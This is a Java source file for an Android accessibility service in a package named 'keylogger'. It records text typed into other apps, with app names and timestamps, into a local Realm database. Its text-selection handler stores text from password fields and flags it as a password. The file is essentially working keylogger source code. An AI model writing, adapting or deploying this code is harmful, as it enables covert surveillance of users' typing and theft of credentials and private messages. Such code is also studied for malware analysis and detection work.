package com.accessibility.keylogger.module.accessibility.service;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import com.accessibility.keylogger.R;
import com.accessibility.keylogger.module.accessibility.object.TypeViewTextChangedEventObject;
import com.accessibility.keylogger.module.accessibility.object.TypeViewTextSelectionChangedEventObject;
import com.accessibility.keylogger.util.LogUtil;

import java.util.List;

import io.realm.Realm;

public class AccessibilityService extends android.accessibilityservice.AccessibilityService {
    private static final String TAG = AccessibilityService.class.getSimpleName();

    // Realm
    private Realm mRealm = null;
    // - Realm

    private TypeViewTextChangedEventObject mTypeViewTextChangedEventObject = null;
    private TypeViewTextSelectionChangedEventObject mTypeViewTextSelectionChangedEventObject = null;

    private void onTypeViewSelected(@NonNull AccessibilityEvent accessibilityEvent) {
        // Package name
        CharSequence packageName = accessibilityEvent.getPackageName();

        // LogUtil.i(TAG, "Accessibility event (package name): " + (packageName != null ? packageName : "N/A"));
        // - Package name

        if (packageName != null && !packageName.equals(getPackageName())) {
            // Event relative
            endTypeViewTextChangedEvent();
            // - Event relative
        }
    }

    private void onTypeViewFocused(@NonNull AccessibilityEvent accessibilityEvent) {
        // Package name
        CharSequence packageName = accessibilityEvent.getPackageName();

        // LogUtil.i(TAG, "Accessibility event (package name): " + (packageName != null ? packageName : "N/A"));
        // - Package name

        if (packageName != null && !packageName.equals(getPackageName())) {
            // Event relative
            endTypeViewTextChangedEvent();
            // - Event relative
        }
    }

    private void onTypeViewTextChanged(@NonNull AccessibilityEvent accessibilityEvent, @Nullable AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            try {
                accessibilityNodeInfo.recycle();
            } catch (Exception e) {
                LogUtil.e(TAG, e.getMessage());
                LogUtil.e(TAG, e.toString());

                e.printStackTrace();
            }
        }

        // Package name
        CharSequence packageName = accessibilityEvent.getPackageName();

        // LogUtil.i(TAG, "Accessibility event (package name): " + (packageName != null ? packageName : "N/A"));
        // - Package name

        if (packageName != null && !packageName.equals(getPackageName())) {
            if (mTypeViewTextChangedEventObject != null
                    && mTypeViewTextSelectionChangedEventObject.getPackageName() != null
                    && !mTypeViewTextChangedEventObject.getPackageName().equals(packageName.toString())
                    ) {
                endTypeViewTextChangedEvent();
            }

            // Event relative
            if (mTypeViewTextChangedEventObject == null
                    || mTypeViewTextChangedEventObject.getLastText() == null
                    || mTypeViewTextChangedEventObject.getLastText().length() != accessibilityEvent.getRemovedCount()
                    || accessibilityEvent.getAddedCount() != 0
                    ) {

                if (!(mTypeViewTextChangedEventObject != null
                        && mTypeViewTextChangedEventObject.getPackageName() != null
                        && mTypeViewTextChangedEventObject.getPackageName().equals(packageName.toString()))
                        ) {
                        beginTypeViewTextChangedEvent(packageName);
                }

                if (mTypeViewTextChangedEventObject != null) {
                    // Text
                    String text = null;

                    List<CharSequence> textCharSequenceList = null;
                    try {
                        textCharSequenceList = accessibilityEvent.getText();
                    } catch (Exception e) {
                        LogUtil.e(TAG, e.getMessage());
                        LogUtil.e(TAG, e.toString());

                        e.printStackTrace();
                    }

                    if (textCharSequenceList != null) {
                        if (textCharSequenceList.size() > 0) {
                            try {
                                text = textCharSequenceList.get(0).toString();
                            } catch (Exception e) {
                                LogUtil.e(TAG, e.getMessage());
                                LogUtil.e(TAG, e.toString());

                                e.printStackTrace();
                            }
                        }
                    }
                    // - Text

                    if (!TextUtils.equals(mTypeViewTextChangedEventObject.getLastText(), text)) {
                        // Realm
                        if (mRealm != null && !mRealm.isClosed()) {
                            try {
                                mRealm.beginTransaction();
                            } catch (Exception e) {
                                LogUtil.e(TAG, e.getMessage());
                                LogUtil.e(TAG, e.toString());

                                e.printStackTrace();
                            }

                            if (!accessibilityEvent.isPassword()) {
                                if (mTypeViewTextChangedEventObject.getText() != null) {
                                    mTypeViewTextChangedEventObject.setText(mTypeViewTextChangedEventObject.getText() + "; " + text);
                                } else {
                                    mTypeViewTextChangedEventObject.setText(text);
                                }

                                mTypeViewTextChangedEventObject.setLastText(text);
                            }

                            try {
                                mRealm.commitTransaction();
                            } catch (Exception e) {
                                LogUtil.e(TAG, e.getMessage());
                                LogUtil.e(TAG, e.toString());

                                e.printStackTrace();
                            }
                        }
                        // - Realm
                    }
                } else {
                    endTypeViewTextChangedEvent();
                }
            } else {
                endTypeViewTextChangedEvent();
            }
            // - Event relative
        }
    }

    private void onTypeViewTextSelectionChanged(@NonNull AccessibilityEvent accessibilityEvent, @Nullable AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            try {
                accessibilityNodeInfo.recycle();
            } catch (Exception e) {
                LogUtil.e(TAG, e.getMessage());
                LogUtil.e(TAG, e.toString());

                e.printStackTrace();
            }
        }

        // Package name
        CharSequence packageName = accessibilityEvent.getPackageName();

        // LogUtil.i(TAG, "Accessibility event (package name): " + (packageName != null ? packageName : "N/A"));
        // - Package name

        if (packageName != null && !packageName.equals(getPackageName())) {
            // Event relative
            // Text
            String text = null;

            List<CharSequence> textCharSequenceList = null;
            try {
                textCharSequenceList = accessibilityEvent.getText();
            } catch (Exception e) {
                LogUtil.e(TAG, e.getMessage());
                LogUtil.e(TAG, e.toString());

                e.printStackTrace();
            }

            if (textCharSequenceList != null) {
                if (textCharSequenceList.size() > 0) {
                    try {
                        text = textCharSequenceList.get(0).toString();
                    } catch (Exception e) {
                        LogUtil.e(TAG, e.getMessage());
                        LogUtil.e(TAG, e.toString());

                        e.printStackTrace();
                    }
                }
            }
            // - Text

            if (text != null) {
                boolean isPassword = false;
                try {
                    isPassword = accessibilityEvent.isPassword();
                } catch (Exception e) {
                    LogUtil.e(TAG, e.getMessage());
                    LogUtil.e(TAG, e.toString());

                    e.printStackTrace();
                }

                // Realm
                if (mRealm != null && !mRealm.isClosed()) {
                    if (mTypeViewTextSelectionChangedEventObject != null) {
                        try {
                            mRealm.beginTransaction();
                        } catch (Exception e) {
                            LogUtil.e(TAG, e.getMessage());
                            LogUtil.e(TAG, e.toString());

                            e.printStackTrace();
                        }

                        if (mTypeViewTextSelectionChangedEventObject.getText() != null) {
                            mTypeViewTextSelectionChangedEventObject.setText(mTypeViewTextSelectionChangedEventObject.getText() + "; " + text);
                        } else {
                            mTypeViewTextSelectionChangedEventObject.setText(text);
                        }

                        if (isPassword) {
                            mTypeViewTextSelectionChangedEventObject.setIsPassword(true);
                        }

                        try {
                            mRealm.commitTransaction();
                        } catch (Exception e) {
                            LogUtil.e(TAG, e.getMessage());
                            LogUtil.e(TAG, e.toString());

                            e.printStackTrace();
                        }
                    }
                }
                // - Realm
            }
            // - Event relative
        }
    }

    private void disable() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                disableSelf();
            } catch (Exception e) {
                LogUtil.e(TAG, e.getMessage());
                LogUtil.e(TAG, e.toString());

                e.printStackTrace();
            }
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        LogUtil.d(TAG, "Service create");

        // Realm
        try {
            mRealm = Realm.getDefaultInstance();
        } catch (Exception e) {
            LogUtil.e(TAG, e.getMessage());
            LogUtil.e(TAG, e.toString());

            e.printStackTrace();
        }
        // - Realm
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        LogUtil.d(TAG, "Service destroy");

        // Realm
        if (mRealm != null) {
            try {
                mRealm.close();
            } catch (Exception e) {
                LogUtil.e(TAG, e.getMessage());
                LogUtil.e(TAG, e.toString());

                e.printStackTrace();
            }

            mRealm = null;
        }
        // - Realm
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        LogUtil.d(TAG, "Service connected");

        // Toast
        try {
            Toast.makeText(this, getString(R.string.app_name) + " Accessibility service connected", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            LogUtil.e(TAG, e.getMessage());
            LogUtil.e(TAG, e.toString());

            e.printStackTrace();
        }
        // - Toast

        AccessibilityServiceInfo accessibilityServiceInfo = null;
        try {
            accessibilityServiceInfo = getServiceInfo();
        } catch (Exception e) {
            LogUtil.e(TAG, e.getMessage());
            LogUtil.e(TAG, e.toString());

            e.printStackTrace();
        }

        if (accessibilityServiceInfo != null) {
            accessibilityServiceInfo.eventTypes = AccessibilityEvent.TYPE_VIEW_SELECTED
                    | AccessibilityEvent.TYPE_VIEW_FOCUSED
                    | AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                    | AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED;

            /*accessibilityServiceInfo.flags = AccessibilityServiceInfo.DEFAULT;*/

            accessibilityServiceInfo.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;

            try {
                setServiceInfo(accessibilityServiceInfo);
            } catch (Exception e) {
                disable();

                LogUtil.e(TAG, e.getMessage());
                LogUtil.e(TAG, e.toString());

                e.printStackTrace();
            }
        } else {
            disable();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent == null) {
            return;
        }

        LogUtil.i(TAG, "Accessibility event");

        // Event type
        int eventType = accessibilityEvent.getEventType();

        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                LogUtil.i(TAG, "Accessibility event (event type): Type view selected");

                onTypeViewSelected(accessibilityEvent);
                break;

            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                LogUtil.i(TAG, "Accessibility event (event type): Type view focused");

                onTypeViewFocused(accessibilityEvent);
                break;

            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                LogUtil.i(TAG, "Accessibility event (event type): Type view text changed");

                AccessibilityNodeInfo typeViewTextChangedNodeInfo = null;
                try {
                    typeViewTextChangedNodeInfo = accessibilityEvent.getSource();
                } catch (Exception e) {
                    LogUtil.e(TAG, e.getMessage());
                    LogUtil.e(TAG, e.toString());

                    e.printStackTrace();
                }

                onTypeViewTextChanged(accessibilityEvent, typeViewTextChangedNodeInfo);
                break;

            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                LogUtil.i(TAG, "Accessibility event (event type): Type view text selection changed");

                AccessibilityNodeInfo typeViewTextSelectionChangedNodeInfo = null;
                try {
                    typeViewTextSelectionChangedNodeInfo = accessibilityEvent.getSource();
                } catch (Exception e) {
                    LogUtil.e(TAG, e.getMessage());
                    LogUtil.e(TAG, e.toString());

                    e.printStackTrace();
                }

                onTypeViewTextSelectionChanged(accessibilityEvent, typeViewTextSelectionChangedNodeInfo);
                break;
        }
        // - Event type
    }

    @Override
    public void onInterrupt() {
        LogUtil.i(TAG, "Interrupt");
    }

    private void beginTypeViewTextChangedEvent(CharSequence packageName) {
        long beginTimestamp = System.currentTimeMillis();

        if (mTypeViewTextChangedEventObject != null || mTypeViewTextSelectionChangedEventObject != null) {
            endTypeViewTextChangedEvent();

            return;
        }

        LogUtil.i(TAG, "Type view text changed event: Begin");

        // Realm
        if (mRealm != null && !mRealm.isClosed()) {
            try {
                mRealm.beginTransaction();
            } catch (Exception e) {
                LogUtil.e(TAG, e.getMessage());
                LogUtil.e(TAG, e.toString());

                e.printStackTrace();
            }

            // Type view text selection changed event
            try {
                mTypeViewTextSelectionChangedEventObject = mRealm.createObject(TypeViewTextSelectionChangedEventObject.class);
            } catch (Exception e) {
                LogUtil.e(TAG, e.getMessage());
                LogUtil.e(TAG, e.toString());

                e.printStackTrace();
            }

            if (mTypeViewTextSelectionChangedEventObject != null) {
                mTypeViewTextSelectionChangedEventObject.setPackageName(packageName.toString());
                mTypeViewTextSelectionChangedEventObject.setTimestamp(beginTimestamp);
            }
            // - Type view text selection changed event

            // Type view text changed event
            try {
                mTypeViewTextChangedEventObject = mRealm.createObject(TypeViewTextChangedEventObject.class);
            } catch (Exception e) {
                LogUtil.e(TAG, e.getMessage());
                LogUtil.e(TAG, e.toString());

                e.printStackTrace();
            }

            if (mTypeViewTextChangedEventObject != null) {
                mTypeViewTextChangedEventObject.setPackageName(packageName.toString());
                mTypeViewTextChangedEventObject.setBeginTimestamp(beginTimestamp);
            }
            // - Type view text changed event

            if (mTypeViewTextChangedEventObject != null && mTypeViewTextSelectionChangedEventObject != null) {
                try {
                    mRealm.commitTransaction();
                } catch (Exception e) {
                    LogUtil.e(TAG, e.getMessage());
                    LogUtil.e(TAG, e.toString());

                    e.printStackTrace();
                }
            } else {
                try {
                    mRealm.cancelTransaction();
                } catch (Exception e) {
                    LogUtil.e(TAG, e.getMessage());
                    LogUtil.e(TAG, e.toString());

                    e.printStackTrace();
                }
            }
        }
        // - Realm
    }

    private void endTypeViewTextChangedEvent() {
        long endTimestamp = System.currentTimeMillis();

        if (mTypeViewTextChangedEventObject != null || mTypeViewTextSelectionChangedEventObject != null) {
            LogUtil.i(TAG, "Type view text changed event: End");

            // Realm
            if (mRealm != null && !mRealm.isClosed()) {
                try {
                    mRealm.beginTransaction();
                } catch (Exception e) {
                    LogUtil.e(TAG, e.getMessage());
                    LogUtil.e(TAG, e.toString());

                    e.printStackTrace();
                }

                if (mTypeViewTextChangedEventObject != null) {
                    if (mTypeViewTextChangedEventObject.getText() != null
                            && mTypeViewTextChangedEventObject.getLastText() != null
                            && mTypeViewTextChangedEventObject.getPackageName() != null
                            ) {
                        mTypeViewTextChangedEventObject.setEndTimestamp(endTimestamp);
                    } else {
                        mTypeViewTextChangedEventObject.deleteFromRealm();
                    }

                    mTypeViewTextChangedEventObject = null;
                }

                if (mTypeViewTextSelectionChangedEventObject != null) {
                    if (!(mTypeViewTextSelectionChangedEventObject.getText() != null
                            && mTypeViewTextSelectionChangedEventObject.getPackageName() != null
                    )) {
                        mTypeViewTextSelectionChangedEventObject.deleteFromRealm();
                    }

                    mTypeViewTextSelectionChangedEventObject = null;
                }

                try {
                    mRealm.commitTransaction();
                } catch (Exception e) {
                    LogUtil.e(TAG, e.getMessage());
                    LogUtil.e(TAG, e.toString());

                    e.printStackTrace();
                }
            }
            // - Realm
        }
    }
}
